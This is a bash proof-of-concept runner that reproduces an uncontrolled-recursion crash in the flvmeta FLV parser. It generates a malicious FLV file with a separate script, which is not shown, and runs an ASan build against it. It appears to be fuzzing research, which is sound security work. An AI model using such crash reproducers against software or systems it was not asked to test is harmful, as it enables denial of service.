#!/bin/bash
# PoC runner for VULN 001: Uncontrolled Recursion via Nested AMF Objects in flvmeta

set -e

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/flvmeta/src_dump_json_c"
FLVMETA="/data/ylwang/non-textfuzz/target/flvmeta/build_test/src/flvmeta"
FLV_FILE="${POC_DIR}/vuln_001.flv"
RESULT_FILE="${POC_DIR}/vuln_001_result.txt"

cd "${POC_DIR}"

echo "[*] PoC for VULN 001: Uncontrolled Recursion in flvmeta"

# Generate the malicious FLV if it doesn't exist
if [ ! -f "${FLV_FILE}" ]; then
    echo "[*] Generating vuln_001.flv ..."
    python3 "${POC_DIR}/vuln_001_gen.py"
else
    echo "[*] vuln_001.flv already exists, skipping generation."
fi

echo "[*] Running flvmeta against vuln_001.flv ..."

ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "${FLVMETA}" "${FLV_FILE}" \
  > "${RESULT_FILE}" 2>&1 || true

echo "[*] flvmeta exited (crash expected)"

# Append any ASAN/UBSAN log output
ASAN_LOGS=$(ls "${POC_DIR}"/asan.log.* 2>/dev/null || true)
if [ -n "${ASAN_LOGS}" ]; then
    echo "" >> "${RESULT_FILE}"
    echo "=== ASAN/UBSAN LOG ===" >> "${RESULT_FILE}"
    for log in ${ASAN_LOGS}; do
        echo "--- ${log} ---" >> "${RESULT_FILE}"
        cat "${log}" >> "${RESULT_FILE}"
    done
fi

echo "[*] Results written to: ${RESULT_FILE}"
echo "[*] Contents:"
cat "${RESULT_FILE}"
